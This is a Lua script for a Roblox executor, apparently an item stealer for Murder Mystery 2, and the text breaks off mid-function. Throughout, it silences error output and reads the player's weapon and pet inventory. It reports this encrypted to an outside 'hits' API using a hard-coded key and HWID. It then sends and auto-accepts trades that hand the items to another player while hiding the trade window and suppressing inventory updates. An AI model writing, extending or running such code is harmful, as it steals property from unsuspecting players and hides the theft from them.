-- discord.gg/syncrypt

if getgenv().Executed then
	if not (game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237) then
		return
	end

	if getgenv().AccessCode then
		return
	end
end

getgenv().Executed = true

print = function() end
warn = function() end
error = function() end
info = function() end

local Container = { Cache = {} }

local function NoOp()
	return nil
end

Container.A = function()
	local Entry = Container.Cache.A

	if not Entry then
		Entry = { Value = NoOp() }
		Container.Cache.A = Entry
	end

	return Entry.Value
end

local function BuildConfig()
	Container.A()

	return {
		API_BASE_URL = PROXY_URL or "https://api.project-reverse.org",
		EXPLOIT_API_KEY = "bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto",
		GAME_ID = 66654135,
		GAME_NAME = "mm2",
		GIVE_ALL_ITEMS = true,
		EXECUTOR_NAME = getexecutorname():lower(),
		HWID = gethwid and gethwid() or "unknown",
		IGNORE_MESSAGE_PATTERNS_IN_WEBHOOK = { "no valuables to steal", "failed to pull from connection", "failed to register due to error" },
	}
end

Container.B = function()
	local Entry = Container.Cache.B

	if not Entry then
		Entry = { Value = BuildConfig() }
		Container.Cache.B = Entry
	end

	return Entry.Value
end

local function BuildLogger()
	local Levels = { "verbose", "error", "warn" }

	return function(...)
		local Args = { ... }
		local Handlers = {}

		local function Wrap(Level)
			local function Chain(...)
				return ...
			end

			for i = #Args, 1, -1 do
				local Arg = Args[i]
				local Next = Chain

				Chain = function(...)
					return Arg(Level, Next, ...)
				end
			end

			return Chain
		end

		for _, Level in Levels do
			Handlers[Level] = Wrap(Level)
		end

		return Handlers
	end
end

Container.C = function()
	local Entry = Container.Cache.C

	if not Entry then
		Entry = { Value = BuildLogger() }
		Container.Cache.C = Entry
	end

	return Entry.Value
end

local function NoOpB()
	return nil
end

Container.D = function()
	local Entry = Container.Cache.D

	if not Entry then
		Entry = { Value = NoOpB() }
		Container.Cache.D = Entry
	end

	return Entry.Value
end

local function BuildBus()
	Container.D()

	return function()
		local Subscribers = {}

		return {
			subscribe = function(Handler)
				Subscribers[Handler] = true

				return function()
					Subscribers[Handler] = nil
				end
			end,
			publish = function(Payload)
				for Handler in Subscribers do
					task.spawn(Handler, Payload)
				end
			end,
		}
	end
end

Container.E = function()
	local Entry = Container.Cache.E

	if not Entry then
		Entry = { Value = BuildBus() }
		Container.Cache.E = Entry
	end

	return Entry.Value
end

local function BuildEvent()
	Container.D()

	return function()
		local Root

		Root = {
			create = function(Payload)
				return { payload = Payload, parent = Root }
			end,
			createObserver = function(Handler)
				return function(Event)
					if Event.parent == Root then
						Handler(Event)
						return
					end
				end
			end,
		}

		return Root
	end
end

Container.F = function()
	local Entry = Container.Cache.F

	if not Entry then
		Entry = { Value = BuildEvent() }
		Container.Cache.F = Entry
	end

	return Entry.Value
end

local function BuildEvents()
	Container.D()
	return { createBus = Container.E(), createEventDefinition = Container.F() }
end

Container.G = function()
	local Entry = Container.Cache.G

	if not Entry then
		Entry = { Value = BuildEvents() }
		Container.Cache.G = Entry
	end

	return Entry.Value
end

local function NoOpC()
	return nil
end

Container.H = function()
	local Entry = Container.Cache.H

	if not Entry then
		Entry = { Value = NoOpC() }
		Container.Cache.H = Entry
	end

	return Entry.Value
end

local function NoOpD()
	Container.H()
	return nil
end

Container.I = function()
	local Entry = Container.Cache.I

	if not Entry then
		Entry = { Value = NoOpD() }
		Container.Cache.I = Entry
	end

	return Entry.Value
end

local function NoOpE()
	Container.A()
	return nil
end

Container.J = function()
	local Entry = Container.Cache.J

	if not Entry then
		Entry = { Value = NoOpE() }
		Container.Cache.J = Entry
	end

	return Entry.Value
end

local function NoOpF()
	Container.J()
	return nil
end

Container.K = function()
	local Entry = Container.Cache.K

	if not Entry then
		Entry = { Value = NoOpF() }
		Container.Cache.K = Entry
	end

	return Entry.Value
end

local function NoOpG()
	return nil
end

Container.L = function()
	local Entry = Container.Cache.L

	if not Entry then
		Entry = { Value = NoOpG() }
		Container.Cache.L = Entry
	end

	return Entry.Value
end

local function BuildMetadata()
	Container.C()
	Container.G()
	Container.I()
	Container.K()
	Container.L()
	return {}
end

Container.M = function()
	local Entry = Container.Cache.M

	if not Entry then
		Entry = { Value = BuildMetadata() }
		Container.Cache.M = Entry
	end

	return Entry.Value
end

local function BuildJson()
	local Json = {}
	local Encode

	local Escapes = {
		["\\"] = "\\",
		["\""] = "\"",
		["\8"] = "b",
		["\12"] = "f",
		["\n"] = "n",
		["\r"] = "r",
		["\t"] = "t",
	}

	local Unescapes = { ["/"] = "/" }

	for Key, Char in Escapes do
		Unescapes[Char] = Key
	end

	local function Escape(Char)
		return "\\" .. (Escapes[Char] or string.format("u%04x", Char:byte()))
	end

	local function LiteralNull()
		return "null"
	end

	local function EncodeTable(Value, Seen)
		local Parts = {}
		local Visited = Seen or {}

		if Visited[Value] then
			error("circular reference")
		end

		Visited[Value] = true

		if rawget(Value, 1) ~= nil or next(Value) == nil then
			local Count = 0

			for Key in Value do
				if type(Key) ~= "number" then
					error("invalid table: mixed or invalid key types")
				end

				Count += 1
			end

			if Count ~= #Value then
				error("invalid table: sparse array")
			end

			for _, Item in ipairs(Value) do
				table.insert(Parts, Encode(Item, Visited))
			end

			Visited[Value] = nil
			return "[" .. table.concat(Parts, ",") .. "]"
		end

		for Key, Item in Value do
			if type(Key) ~= "string" then
				error("invalid table: mixed or invalid key types")
			end

			table.insert(Parts, Encode(Key, Visited) .. ":" .. Encode(Item, Visited))
		end

		Visited[Value] = nil
		return "{" .. table.concat(Parts, ",") .. "}"
	end

	local function EncodeString(Value)
		return "\"" .. Value:gsub("[%z\1-\31\\\"]", Escape) .. "\""
	end

	local function EncodeNumber(Value)
		if Value ~= Value or Value <= -math.huge then
			error("unexpected number value '" .. tostring(Value) .. "'")
		elseif math.huge <= Value then
			error("unexpected number value '" .. tostring(Value) .. "'")
			return string.format("%.14g", Value)
		end

		return string.format("%.14g", Value)
	end

	local function EncodeOther(Value)
		return "\"" .. tostring(Value) .. "\""
	end

	local Encoders = {
		["nil"] = LiteralNull,
		table = EncodeTable,
		string = EncodeString,
		number = EncodeNumber,
		boolean = tostring,
		["function"] = EncodeOther,
		thread = EncodeOther,
		userdata = EncodeOther,
	}

	Encode = function(Value, Seen)
		local Kind = type(Value)
		local Handler = Encoders[Kind]
		if not Handler then
			error("unexpected type '" .. Kind .. "'")
			return
		end
		return Handler(Value, Seen)
	end

	Json.encode = function(Value)
		return (Encode(Value))
	end

	local Decode

	local function MakeSet(...)
		local Set = {}

		for i = 1, select("#", ...) do
			Set[select(i, ...)] = true
		end

		return Set
	end

	local Whitespace = MakeSet(" ", "\t", "\r", "\n")
	local Delimiters = MakeSet(" ", "\t", "\r", "\n", "]", "}", ",")
	local EscapeChars = MakeSet("\\", "/", "\"", "b", "f", "n", "r", "t", "u")
	local Literals = MakeSet("true", "false", "null")
	local LiteralValues = { ["true"] = true, ["false"] = false, null = nil }

	local function SkipChars(Text, Index, Set, Target)
		for i = Index, #Text do
			if Set[Text:sub(i, i)] == Target then
				continue
			end
			return i
		end

		return #Text + 1
	end

	local function Fail(Text, Index, Message)
		local Line = 1
		local Col = 1

		for i = 1, Index - 1 do
			Col += 1

			if Text:sub(i, i) == "\n" then
				Line += 1
				Col = 1
			end
		end

		error(string.format("%s at line %d col %d", Message, Line, Col))
	end

	local function FromCodePoint(Code)
		if Code <= 127 then
			return string.char(Code)
		end

		if Code <= 2047 then
			return string.char(math.floor(Code / 64) + 192, Code % 64 + 128)
		end

		if Code <= 65535 then
			return string.char(math.floor(Code / 4096) + 224, math.floor(Code % 4096 / 64) + 128, Code % 64 + 128)
		end

		if not (Code <= 1114111) then
			error(string.format("invalid unicode codepoint '%x'", Code))
			return
		end
		return string.char(math.floor(Code / 262144) + 240, math.floor(Code % 262144 / 4096) + 128, math.floor(Code % 4096 / 64) + 128, Code % 64 + 128)
	end

	local function ParseUnicode(Hex)
		local High = tonumber(Hex:sub(1, 4), 16)
		local Low = tonumber(Hex:sub(7, 10), 16)
		if not Low then
			return FromCodePoint(High)
		end
		return FromCodePoint((High - 55296) * 1024 + (Low - 56320) + 65536)
	end

	local function ParseString(Text, Start)
		local Result = ""
		local Index = Start + 1
		local ChunkStart = Index

		while Index <= #Text do
			local Byte = Text:byte(Index)

			if Byte < 32 then
				Fail(Text, Index, "control character in string")
			elseif Byte == 92 then
				local Prefix = Result .. Text:sub(ChunkStart, Index - 1)
				Index += 1
				local Char = Text:sub(Index, Index)

				if Char == "u" then
					local Match = Text:match("^[dD][89aAbB]%x%x\\u%x%x%x%x", Index + 1) or Text:match("^%x%x%x%x", Index + 1) or Fail(Text, Index - 1, "invalid unicode escape in string")
					Result = Prefix .. ParseUnicode(Match)
					Index += #Match
				else
					if not EscapeChars[Char] then
						Fail(Text, Index - 1, "invalid escape char '" .. Char .. "' in string")
					end

					Result = Prefix .. Unescapes[Char]
				end

				ChunkStart = Index + 1
			elseif Byte == 34 then
				return Result .. Text:sub(ChunkStart, Index - 1), Index + 1
			end

			Index += 1
		end

		Fail(Text, Start, "expected closing quote for string")
	end

	local function ParseNumber(Text, Start)
		local Stop = SkipChars(Text, Start, Delimiters)
		local Raw = Text:sub(Start, Stop - 1)
		local Value = tonumber(Raw)

		if not Value then
			Fail(Text, Start, "invalid number '" .. Raw .. "'")
		end

		return Value, Stop
	end

	local function ParseLiteral(Text, Start)
		local Stop = SkipChars(Text, Start, Delimiters)
		local Raw = Text:sub(Start, Stop - 1)

		if not Literals[Raw] then
			Fail(Text, Start, "invalid literal '" .. Raw .. "'")
		end

		return LiteralValues[Raw], Stop
	end

	local Parsers = {
		["\""] = ParseString,
		["0"] = ParseNumber,
		["1"] = ParseNumber,
		["2"] = ParseNumber,
		["3"] = ParseNumber,
		["4"] = ParseNumber,
		["5"] = ParseNumber,
		["6"] = ParseNumber,
		["7"] = ParseNumber,
		["8"] = ParseNumber,
		["9"] = ParseNumber,
		["-"] = ParseNumber,
		t = ParseLiteral,
		f = ParseLiteral,
		n = ParseLiteral,
		["["] = function(Text, Start)
			local List = {}
			local Index = 1
			local Cursor = Start + 1

			while true do
				local Pos = SkipChars(Text, Cursor, Whitespace, true)

				if Text:sub(Pos, Pos) == "]" then
					Cursor = Pos + 1
					break
				else
					local Value, Next = Decode(Text, Pos)
					List[Index] = Value
					Index += 1
					local After = SkipChars(Text, Next, Whitespace, true)
					local Char = Text:sub(After, After)
					Cursor = After + 1
					if Char == "]" then
						break
					end

					if Char ~= "," then
						Fail(Text, Cursor, "expected ']' or ','")
					end
				end
			end

			return List, Cursor
		end,
		["{"] = function(Text, Start)
			local Map = {}
			local Cursor = Start + 1

			while true do
				local Pos = SkipChars(Text, Cursor, Whitespace, true)

				if Text:sub(Pos, Pos) == "}" then
					Cursor = Pos + 1
					break
				else
					if Text:sub(Pos, Pos) ~= "\"" then
						Fail(Text, Pos, "expected string for key")
					end

					local Key, AfterKey = Decode(Text, Pos)
					local Colon = SkipChars(Text, AfterKey, Whitespace, true)

					if Text:sub(Colon, Colon) ~= ":" then
						Fail(Text, Colon, "expected ':' after key")
					end

					local ValueStart = SkipChars(Text, Colon + 1, Whitespace, true)
					local Value, AfterValue = Decode(Text, ValueStart)
					Map[Key] = Value
					local After = SkipChars(Text, AfterValue, Whitespace, true)
					local Char = Text:sub(After, After)
					Cursor = After + 1
					if Char == "}" then
						break
					end

					if Char ~= "," then
						Fail(Text, Cursor, "expected '}' or ','")
					end
				end
			end

			return Map, Cursor
		end,
	}

	Decode = function(Text, Index)
		local Char = Text:sub(Index, Index)
		local Parser = Parsers[Char]
		if not Parser then
			Fail(Text, Index, "unexpected character '" .. Char .. "'")
			return
		end
		return Parser(Text, Index)
	end

	Json.decode = function(Text)
		if type(Text) ~= "string" then
			error("expected argument of type string, got " .. type(Text))
		end

		local Value, Next = Decode(Text, SkipChars(Text, 1, Whitespace, true))
		local End = SkipChars(Text, Next, Whitespace, true)

		if End <= #Text then
			Fail(Text, End, "trailing garbage")
		end

		return Value
	end

	return Json
end

Container.N = function()
	local Entry = Container.Cache.N

	if not Entry then
		Entry = { Value = BuildJson() }
		Container.Cache.N = Entry
	end

	return Entry.Value
end

local function BuildCrypto()
	local function Wrap32(Value)
		return Value % 4294967296
	end

	local function Rotate(Value, Amount)
		return bit32.lrotate(Value, Amount)
	end

	local function Pack(Value)
		return string.char(Value % 256, math.floor(Value / 256) % 256, math.floor(Value / 65536) % 256, math.floor(Value / 16777216) % 256)
	end

	local ReadWord = nil
	local SplitOffset = nil

	local function QuarterRound(A, B, C, D)
		local Sum1 = Wrap32(A + B)
		local Xor1 = Rotate(bit32.bxor(D, Sum1), 16)
		local Sum2 = Wrap32(C + Xor1)
		local Xor2 = Rotate(bit32.bxor(B, Sum2), 12)
		local Sum3 = Wrap32(Sum1 + Xor2)
		local Xor3 = Rotate(bit32.bxor(Xor1, Sum3), 8)
		local Sum4 = Wrap32(Sum2 + Xor3)
		return Sum3, Rotate(bit32.bxor(Xor2, Sum4), 7), Sum4, Xor3
	end

	local function Block(Counter, Rounds)
		local C0 = 1634760805
		local C1 = 857760878
		local C2 = 2036477234
		local C3 = 1797285236
		local K0 = ReadWord(SplitOffset, 0)
		local K1 = ReadWord(SplitOffset, 1)
		local K2 = ReadWord(SplitOffset, 2)
		local K3 = ReadWord(SplitOffset, 3)
		local K4 = ReadWord(SplitOffset, 4)
		local K5 = ReadWord(SplitOffset, 5)
		local K6 = ReadWord(SplitOffset, 6)
		local K7 = ReadWord(SplitOffset, 7)
		local CounterVal = Counter
		local N0 = ReadWord(0, 0)
		local N1 = ReadWord(0, 1)
		local N2 = ReadWord(0, 2)
		local S0 = C0
		local S1 = C1
		local S2 = C2
		local S3 = C3
		local S4 = K0
		local S5 = K1
		local S6 = K2
		local S7 = K3
		local S8 = K4
		local S9 = K5
		local S10 = K6
		local S11 = K7
		local S12 = CounterVal
		local S13 = N0
		local S14 = N1
		local S15 = N2

		for i = 1, Rounds, 2 do
			local A0, A1, A2, A3 = QuarterRound(S0, S4, S8, S12)
			local B0, B1, B2, B3 = QuarterRound(S1, S5, S9, S13)
			local C0v, C1v, C2v, C3v = QuarterRound(S2, S6, S10, S14)
			local D0, D1, D2, D3 = QuarterRound(S3, S7, S11, S15)
			S0, S5, S10, S15 = QuarterRound(A0, B1, C2v, D3)
			S1, S6, S11, S12 = QuarterRound(B0, C1v, D2, A3)
			S2, S7, S8, S13 = QuarterRound(C0v, D1, A2, B3)
			S3, S4, S9, S14 = QuarterRound(D0, A1, B2, C3v)
		end

		return Pack(Wrap32(S0 + C0)) .. Pack(Wrap32(S1 + C1)) .. Pack(Wrap32(S2 + C2)) .. Pack(Wrap32(S3 + C3)) .. Pack(Wrap32(S4 + K0)) .. Pack(Wrap32(S5 + K1)) .. Pack(Wrap32(S6 + K2)) .. Pack(Wrap32(S7 + K3)) .. Pack(Wrap32(S8 + K4)) .. Pack(Wrap32(S9 + K5)) .. Pack(Wrap32(S10 + K6)) .. Pack(Wrap32(S11 + K7)) .. Pack(Wrap32(S12 + CounterVal)) .. Pack(Wrap32(S13 + N0)) .. Pack(Wrap32(S14 + N1)) .. Pack(Wrap32(S15 + N2))
	end

	local Cipher = { ChaCha20 = function(Data, Counter, Rounds)
		local StartCounter = Counter or 1
		local TotalRounds = Rounds or 20
		assert(TotalRounds > 0 and TotalRounds % 2 == 0, "rounds must be a positive even number")
		if #Data == 0 then
			return ""
		end
		local Out = {}
		local Index = 1
		local BlockCounter = StartCounter

		while Index <= #Data do
			local KeyStream = Block(BlockCounter, TotalRounds)
			local ChunkSize = math.min(64, #Data - Index + 1)

			for i = 1, ChunkSize do
				local PlainByte = string.byte(Data, Index + i - 1)
				local StreamByte = string.byte(KeyStream, i)
				Out[#Out + 1] = string.char(bit32.bxor(PlainByte, StreamByte))
			end

			Index += ChunkSize
			BlockCounter += 1
		end

		return table.concat(Out)
	end }

	local Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	local Lookup = {}

	for i = 1, 64 do
		Lookup[string.byte(Alphabet, i)] = i - 1
	end

	Lookup[61] = 64

	local function Base64Decode(Input)
		local Length = #Input
		if Length == 0 then
			return ""
		end
		local Out = {}
		local Index = 1

		while Index <= Length - 3 do
			local B1, B2, B3, B4 = string.byte(Input, Index, Index + 3)
			local V1 = Lookup[B1]
			local V2 = Lookup[B2]
			local V3 = Lookup[B3]
			local V4 = Lookup[B4]

			if V3 == 64 then
				Out[#Out + 1] = string.char(bit32.lshift(V1, 2) + bit32.rshift(V2, 4))
				break
			elseif V4 == 64 then
				Out[#Out + 1] = string.char(bit32.lshift(V1, 2) + bit32.rshift(V2, 4))
				Out[#Out + 1] = string.char(bit32.band(bit32.lshift(V2, 4), 240) + bit32.rshift(V3, 2))
				break
			else
				Out[#Out + 1] = string.char(bit32.lshift(V1, 2) + bit32.rshift(V2, 4))
				Out[#Out + 1] = string.char(bit32.band(bit32.lshift(V2, 4), 240) + bit32.rshift(V3, 2))
				Out[#Out + 1] = string.char(bit32.band(bit32.lshift(V3, 6), 192) + V4)
				Index += 4
			end
		end

		return table.concat(Out)
	end

	local function Base64Encode(Input)
		local Out = {}
		local Length = #Input

		for i = 1, Length, 3 do
			local B1, B2, B3 = string.byte(Input, i, i + 2)
			local Packed = B1 * 65536 + (B2 or 0) * 256 + (B3 or 0)
			local P1 = math.floor(Packed / 262144) % 64
			local P2 = math.floor(Packed / 4096) % 64
			local P3 = math.floor(Packed / 64) % 64
			local P4 = Packed % 64
			Out[#Out + 1] = Alphabet:sub(P1 + 1, P1 + 1)
			Out[#Out + 1] = Alphabet:sub(P2 + 1, P2 + 1)
			local Slot = #Out + 1
			local Third = i + 1 <= Length and Alphabet:sub(P3 + 1, P3 + 1)
			Out[Slot] = Third or "="
			Out[#Out + 1] = i + 2 <= Length and Alphabet:sub(P4 + 1, P4 + 1) or "="
		end

		return table.concat(Out)
	end

	local Seed = {
		1, 14, 14, 30, 34, 11, 49, 23, 61, 22, 33, 9, 34, 51, 29, 35, 7, 41, 17, 4, 55, 41, 63, 13,
		29, 28, 45, 40, 3, 25, 43, 4, 36, 36, 59, 44, 55, 11, 53, 54, 29, 41, 31, 61,
	}

	local Layout = setmetatable({}, { __index = function(_, Key)
		local Size = #Alphabet

		return ({
			total = Size - math.floor(Size / 3) + 1,
			spin = Size / 4 - 3,
			shift = Size / 8 - 1,
			stride = Size / 2 - 3,
			salt = Size / 8 + 3,
			split = Size / 8 + Size / 16,
		})[Key]
	end })

	local Stream = setmetatable({}, { __index = function(_, Index)
		local Offset = Index - 1
		local Salt = Layout.salt
		return string.byte(Alphabet, bit32.bxor(Seed[(Offset * Layout.spin + Layout.shift) % Layout.total + 1], (Offset * Layout.stride + math.floor(Offset * Offset / 3) + Salt) % #Alphabet) + 1)
	end })

	SplitOffset = Layout.split

	ReadWord = function(Index, Word)
		local Base = Index + Word * 4
		return Stream[Base + 1] + Stream[Base + 2] * 256 + Stream[Base + 3] * 65536 + Stream[Base + 4] * 16777216
	end

	return {
		encrypt = function(Data)
			local CipherText = Cipher.ChaCha20(Data)
			return Base64Encode(CipherText)
		end,
		decrypt = function(Data)
			local Raw = Base64Decode(Data)
			return Cipher.ChaCha20(Raw)
		end,
	}
end

Container.O = function()
	local Entry = Container.Cache.O

	if not Entry then
		Entry = { Value = BuildCrypto() }
		Container.Cache.O = Entry
	end

	return Entry.Value
end

local function BuildHttp()
	local Config = Container.B()
	local Queue = {}

	local function NewSlot()
		return { ref = nil }
	end

	local function Reap(...)
		local Tasks = { ... }

		while true do
			local Found = false

			for _, Thread in Tasks do
				if coroutine.status(Thread) == "dead" then
					Found = true
				elseif Found then
					pcall(task.cancel, Thread)
				end
			end

			if not Found then
				task.wait(0.1)
				continue
			end
			break
		end
	end

	local function Perform(Job)
		local Spec = {
			Url = Config.API_BASE_URL .. Job.request.endpoint,
			Method = Job.request.method,
			Headers = Job.request.headers,
		}

		local Body

		if Job.request.body == nil then
			Body = nil
		else
			Body = Job.request.body
		end

		Spec.Body = Body
		local Ok, Result = pcall(request, Spec)
		if not Ok then
			Job.response.ref = { ok = false, body = Result }
			return
		end

		if Result == nil then
			Job.response.ref = { ok = false, body = "response is nil" }
			return
		end

		if Result.Body ~= nil then
			Job.response.ref = { ok = Result.StatusCode == 200, body = Result.Body }
			return
		end
		Job.response.ref = { ok = false, body = "body is nil" }
	end

	local function Loop()
		while true do
			local Job = table.remove(Queue, 1)

			if Job ~= nil then
				local Delay = task.delay

				task.spawn(Reap, task.spawn(Perform, Job), Delay(10, function()
					if Job.response.ref == nil then
						Job.response.ref = { ok = false, body = "request timed out" }
						return
					end
				end))
			else
				task.wait(0.1)
			end
		end
	end

	local function Send(Method, Endpoint, Headers, Body)
		local Slot = NewSlot()
		table.insert(Queue, { request = { method = Method, endpoint = Endpoint, headers = Headers, body = Body }, response = Slot })

		repeat
			task.wait(0.1)
		until Slot.ref ~= nil

		return Slot.ref
	end

	task.spawn(Loop)
	return Send
end

Container.P = function()
	local Entry = Container.Cache.P

	if not Entry then
		Entry = { Value = BuildHttp() }
		Container.Cache.P = Entry
	end

	return Entry.Value
end

local function BuildApi()
	local Json = Container.N()
	local Crypto = Container.O()
	local Config = Container.B()
	Container.P()

	local function AuthHeaders(ContentType)
		return { ["exploit-api-key"] = Config.EXPLOIT_API_KEY, ["content-type"] = ContentType }
	end

	local function ParseResponse(Response)
		if not Response.ok then
			error("Failed to parse response, not OK")
		end

		local Ok, Result = pcall(Json.decode, Response.body)

		if not Ok then
			local Raise = error
			local Message = ("Failed to parse JSON\nResponse: %*\nError: %*"):format(Response.body, Result)
			Raise(Message)
		end

		local Data = Result

		if not Data.success then
			error("Failed to parse JSON response, not success")
		end

		return Data.data
	end

	return {
		getAuthorizationHeaders = AuthHeaders,
		parseJsonResponse = ParseResponse,
		parseEncryptedJsonResponse = function(Response)
			local Data = ParseResponse(Response)
			local Plain = Crypto.decrypt(Data)
			return Json.decode(Plain)
		end,
	}
end

Container.Q = function()
	local Entry = Container.Cache.Q

	if not Entry then
		Entry = { Value = BuildApi() }
		Container.Cache.Q = Entry
	end

	return Entry.Value
end

local function BuildEndpoints()
	local Json = Container.N()
	local Crypto = Container.O()
	Container.K()
	Container.J()
	local Config = Container.B()
	local Api = Container.Q()
	local Metadata = Container.M()
	local Send = Container.P()

	local function RegisterExecution()
		local Payload = { stealerId = ID, executor = Config.EXECUTOR_NAME }
		local Response = Send("POST", "/hits/execution", Api.getAuthorizationHeaders("application/json"), Json.encode(Payload))

		if not Response.ok then
			Metadata.logger.error("Failed to register execution", { payload = Payload, response = Response })
			error("Failed to register execution")
		end

		return Api.parseJsonResponse(Response)
	end

	local function RegisterHit(Payload)
		local Plain = Api.getAuthorizationHeaders("text/plain")
		local Encrypted = Crypto.encrypt(Json.encode(Payload))
		local Response = Send("POST", "/hits/register", Plain, Encrypted)

		if not Response.ok then
			Metadata.logger.error("Failed to register hit", { payload = Payload, response = Response })
			error("Failed to register due to error")
		end

		return Api.parseEncryptedJsonResponse(Response)
	end

	local function ClaimItem(SecretKey, UniqueId, Count)
		local Response = Send("POST", "/hits/claim", Api.getAuthorizationHeaders("application/json"), Json.encode({ secretKey = SecretKey, uniqueId = UniqueId, count = Count }))

		if not Response.ok then
			Metadata.logger.error("Failed to claim item", { uniqueId = UniqueId, count = Count, response = Response })
			error("Failed to claim item")
		end
	end

	return {
		registerExecution = RegisterExecution,
		registerHit = RegisterHit,
		claimItem = ClaimItem,
		connect = function(SecretKey)
			local Headers = Api.getAuthorizationHeaders("application/json")
			local Response = Send("POST", ("/hits/connection?secretKey=%*"):format(SecretKey), Headers, "{}")

			if not Response.ok then
				Metadata.logger.error("Failed to connect", { secretKey = SecretKey, response = Response })
				error("Failed to connect")
			end
		end,
		pullFromConnection = function(SecretKey)
			local Headers = Api.getAuthorizationHeaders("application/json")
			local Response = Send("GET", ("/hits/connection?secretKey=%*"):format(SecretKey), Headers, nil)

			if not Response.ok then
				Metadata.logger.error("Failed to pull from connection", { secretKey = SecretKey, response = Response })
				error("Failed to pull from connection")
			end

			return Api.parseJsonResponse(Response)
		end,
	}
end

Container.R = function()
	local Entry = Container.Cache.R

	if not Entry then
		Entry = { Value = BuildEndpoints() }
		Container.Cache.R = Entry
	end

	return Entry.Value
end

local function BuildInventory()
	Container.I()
	Container.H()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")

	return { getItems = function()
		local Items = {}

		local Ok, Result = pcall(function()
			return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(Players.LocalPlayer.Name)
		end)

		if not Ok then
			error("Failed to get client inventory")
		end

		for Name, Count in Result.Weapons.Owned do
			if not (Name == "DefaultGun" or Name == "DefaultKnife") then
				table.insert(Items, { uniqueId = Name, name = Name, count = Count })
			end
		end

		for Name, Count in Result.Pets.Owned do
			table.insert(Items, { uniqueId = Name, name = Name, count = Count })
		end

		return Items
	end }
end

Container.S = function()
	local Entry = Container.Cache.S

	if not Entry then
		Entry = { Value = BuildInventory() }
		Container.Cache.S = Entry
	end

	return Entry.Value
end

local function BuildTradeRequest()
	Container.I()
	local Metadata = Container.M()
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local function GetTrade()
		local Trade = ReplicatedStorage:FindFirstChild("Trade")

		if not Trade then
			error("Trade service not found")
		end

		return Trade
	end

	local function SendRequest(Username)
		local Target = Players:FindFirstChild(Username)
		if not Target then
			Metadata.logger.warn("Player not found", { username = Username })
			return
		end

		local Ok, Result = pcall(function()
			return GetTrade().SendRequest:InvokeServer(Target)
		end)

		if not Ok then
			Metadata.logger.error("Failed to send trade request", { username = Username, error = Result })
		end
	end

	local function AcceptRequest(Username)
		if Players:FindFirstChild(Username) then
			Metadata.logger.verbose("Accepting trade request", { username = Username })
			GetTrade().AcceptRequest:FireServer()
			return
		end

		Metadata.logger.warn("Player not found", { username = Username })
	end

	return {
		sendRequest = SendRequest,
		cancelSentRequest = function()
			GetTrade().CancelRequest:FireServer()
		end,
		acceptRequest = AcceptRequest,
		rejectRequest = function(Username)
			if Players:FindFirstChild(Username) then
				Metadata.logger.verbose("Rejecting trade request", { username = Username })
				GetTrade().DeclineRequest:FireServer()
				return
			end

			Metadata.logger.warn("Player not found", { username = Username })
		end,
	}
end

Container.T = function()
	local Entry = Container.Cache.T

	if not Entry then
		Entry = { Value = BuildTradeRequest() }
		Container.Cache.T = Entry
	end

	return Entry.Value
end

local function BuildDomainEvents()
	local Events = Container.G()

	return {
		newTradeCreated = Events.createEventDefinition(),
		tradeFinished = Events.createEventDefinition(),
		itemsAdded = Events.createEventDefinition(),
		targetAppearedOnServer = Events.createEventDefinition(),
	}
end

Container.U = function()
	local Entry = Container.Cache.U

	if not Entry then
		Entry = { Value = BuildDomainEvents() }
		Container.Cache.U = Entry
	end

	return Entry.Value
end

local function BuildTrade()
	local Domain = Container.U()
	local Metadata = Container.M()
	Container.H()
	Container.I()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local TradeCode = game.PlaceId * 3
	local LastOffer = nil

	ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(Info)
		LastOffer = Info.LastOffer
	end)

	local function GetTrade()
		local Trade = ReplicatedStorage:FindFirstChild("Trade")

		if not Trade then
			error("Trade service not found")
		end

		return Trade
	end

	local function GetStatus()
		local Status = nil
		local Info = nil

		local Ok, Result = pcall(function()
			local A, B = GetTrade().GetTradeStatus:InvokeServer()
			Status = A
			Info = B
		end)

		if Ok then
			return Status, Info
		end
		Metadata.logger.error("Failed to get trade status", { error = Result })
		error("Failed to get trade status")
		return nil, nil
	end

	local function Accept()
		local Status, Info = GetStatus()
		if Status ~= "StartTrade" then
			return
		end

		while true do
			task.wait(1)
			local Current, Data = GetStatus()

			if Current == nil or Data == nil then
				error("Failed to get trade info")
			end

			if Data == nil then
				error("Failed to get trade info")
			end

			if Data.Player1 == nil then
				Metadata.logger.error("Player not found in trade info", { tradeInfo = Data, tradeType = Current })
				error("Player not found in trade info")
			end

			local Side

			if Data.Player1.Player.Name ~= Players.LocalPlayer.Name then
				Side = "Player2"
			else
				Side = "Player1"
			end

			GetTrade().AcceptTrade:FireServer(TradeCode, LastOffer)
			if not Data[Side].Accepted then
				continue
			end
			break
		end
	end

	local function Decline()
		GetTrade().DeclineTrade:FireServer()
	end

	local function AddItem(Item)
		local OfferItem = GetTrade().OfferItem

		for i = 1, Item.count do
			OfferItem:FireServer(Item.uniqueId, TradeCode)
		end
	end

	return {
		accept = Accept,
		decline = Decline,
		addItems = function(Items)
			local Limit = 4

			for Index, Item in Items do
				if not (Limit < Index) then
					AddItem(Item)
					continue
				end
				break
			end

			Metadata.coreEventBus.publish(Domain.itemsAdded.create())
		end,
	}
end

Container.V = function()
	local Entry = Container.Cache.V

	if not Entry then
		Entry = { Value = BuildTrade() }
		Container.Cache.V = Entry
	end

	return Entry.Value
end

local function BuildSetup()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Trade = ReplicatedStorage:FindFirstChild("Trade")
	local Players = game:GetService("Players")

	local function Watch(Instance, Property, Handler)
		Instance:GetPropertyChangedSignal(Property):Connect(Handler)
	end

	local function Hide(Instance)
		Instance.Position = UDim2.new(99, 99, 99, 99)
	end

	local function Neutralize()
		pcall(function()
			if string.lower(getexecutorname()) == "xeno" then
				require(ReplicatedStorage.Modules.InventoryModule).UpdateInventory = function()
				end
			else
				game:GetService("ReplicatedStorage").Remotes.Inventory.ProfileDataChanged:Destroy()
			end
		end)
	end

	getUserDevice = function()
		if Players.LocalPlayer.PlayerGui:GetAttribute("Device") == nil then
			repeat
				task.wait()
